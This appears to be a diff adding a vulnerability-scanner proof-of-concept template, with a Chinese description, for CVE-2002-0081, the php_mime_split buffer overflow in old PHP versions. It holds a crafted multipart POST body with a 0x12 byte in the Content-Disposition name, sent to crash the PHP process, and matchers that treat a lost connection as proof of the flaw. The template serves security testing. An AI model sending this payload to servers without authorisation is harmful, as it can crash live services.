@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "检测目标 PHP 是否受 php_mime_split 缓冲区溢出漏洞影响。向目标 PHP 文件发送特制的 multipart/form-data POST 请求，Content-Disposition 中包含 0x12 字节触发 php_mime_split 边界检查缺陷。若 PHP 进程崩溃导致端口不可达，则判定存在漏洞。影响 PHP 3.0.x-4.1.1 版本。"
+id = "POC-AVE-2002-0168"
+name = "PHP php_mime_split 缓冲区溢出远程代码执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2002-0081",
+    "php",
+    "buffer-overflow",
+    "rce",
+]
+vuln_id = [
+    "CVE-2002-0081",
+    "AVE-2002-0168",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+---VTTEST!\r
+Content-Disposition: form-data; name="\u0012"\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=-VTTEST!"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Connection refused",
+    "Connection reset",
+    "no route to host",
+]
